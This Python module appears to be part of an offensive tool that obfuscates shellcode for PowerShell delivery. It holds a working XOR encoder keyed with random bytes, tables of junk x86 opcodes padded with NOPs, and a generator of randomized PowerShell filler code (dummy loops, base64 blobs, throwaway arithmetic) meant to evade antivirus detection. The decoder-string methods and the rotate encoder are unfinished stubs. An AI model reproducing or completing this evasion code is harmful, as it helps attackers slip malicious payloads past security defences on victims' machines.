import random

from base64 import b64encode

from utils import randomBytes, randomStr

OPCODES = [
    [0x48, 0x31, 0xc0, 0x90],
    [0x31, 0xc0, 0x90, 0x90],
    [0x66, 0x31, 0xc0, 0x90],
    [0x30, 0xc0, 0x90, 0x90],
    [0x30, 0xe4, 0x90, 0x90],
    [0x48, 0x31, 0xc9, 0x90],
    [0x31, 0xc9, 0x90, 0x90],
    [0x66, 0x31, 0xc9, 0x90],
    [0x30, 0xc9, 0x90, 0x90],
    [0x30, 0xed, 0x90, 0x90],
    [0x48, 0x31, 0xdb, 0x90],
    [0x31, 0xdb, 0x90, 0x90],
    [0x66, 0x31, 0xdb, 0x90],
    [0x30, 0xdb, 0x90, 0x90],
    [0x30, 0xff, 0x90, 0x90],
    [0x48, 0x31, 0xd2, 0x90],
    [0x31, 0xd2, 0x90, 0x90],
    [0x66, 0x31, 0xd2, 0x90],
    [0x30, 0xd2, 0x90, 0x90],
    [0x30, 0xf6, 0x90, 0x90],
    [0x48, 0x31, 0xf6, 0x90],
    [0x31, 0xf6, 0x90, 0x90],
    [0x66, 0x31, 0xf6, 0x90]
]

class Obfuscator():
    def __init__(self):
        self.key = randomBytes(random.randint(128, 256))
        self.len_key = len(self.key)
        self.key_formated = f"@({','.join([f'0x{x:02x}' for x in self.key])})"

    def encode():
        pass

    def get_decoder_string():
        pass

class XOREncoder(Obfuscator):
    def encode(self, data) -> bytes:
        enc = bytearray()

        for i in range(len(data)):
            enc.append(data[i] ^ self.key[i % self.len_key])

        return bytes(enc)

    def get_decoder_string(self, var_byte, var_shellcode) -> str:
        #return f"""${var_byte} = (${var_shellcode}[$i] + {hex(self.key)}) - 2 * (${var_shellcode}[$i] -band {hex(self.key)})"""
        pass
        
class RotateLeftEncoder(Obfuscator):
    # soon
    def encode(self, data) -> bytes:
        key = random.randint(1, 7)
        return bytes([(x << key) & 0xff for x in data])

    def get_decoder_string(self) -> str:
        #return f"""$sh = ${var("shellcode")}[$i] -shl 0x{random.randint(1, 7)}"""

        pass

def junkCode() -> str:
    fun01 = randomStr(5, 30)

    var01 = randomStr(5, 30)
    var02 = randomStr(5, 30)
    var03 = randomStr(5, 30)

    LIST_JUNKS = [
f"""
function {fun01} {{
    param([string]${var03})

    ${var01} = {random.randint(128, 512)}
    ${var02} = {random.randint(128, 512)}

    while ($true){{
        if (${var01} -eq ${var02}){{break;}}
        if (${var01} -gt ${var02}){{${var01} = ${var01} - 1;}}
        if (${var01} -lt ${var02}){{${var02} = ${var02} - 1;}}
    }}
    return "{randomStr(5, 30)}" | Out-Null
}}

{"\n".join([f"{fun01} -{var03} {b64encode(randomStr(200, 250).encode()).decode()}" for _ in range(random.randint(5,10))])}
""",
f"""
{
    "\n".join(
        [f"${randomStr(5,30)} = {random.randint(100, 10000)} {random.choices(['-', '+', '/', '*'])[0]} {random.randint(100, 10000)}" for _ in range(random.randint(5,10))]
    )
}
""",
f"""
try{{
    {randomStr(30, 40)} -split "." |%{{ {randomStr(30, 40)} $_}}
}} catch {{
    ${randomStr(40, 50)} = $_.Exception
    sleep {random.randint(2,5)}
}}
"""
    ]

    return random.choices(LIST_JUNKS)[0]

def junkOPCodes(len_junks=3, base_var="junk") -> tuple:
    key = randomStr(5, 30)
    ops = []

    for i in range(random.randint(20, 50)):
        op = OPCODES[random.randint(0, len(OPCODES) - 1)]
        ops.append("@(0x{:02x},0x{:02x},0x{:02x},0x{:02x})".format(op[0], op[1], op[2], op[3]))

    return (key, f"@({','.join(ops)})")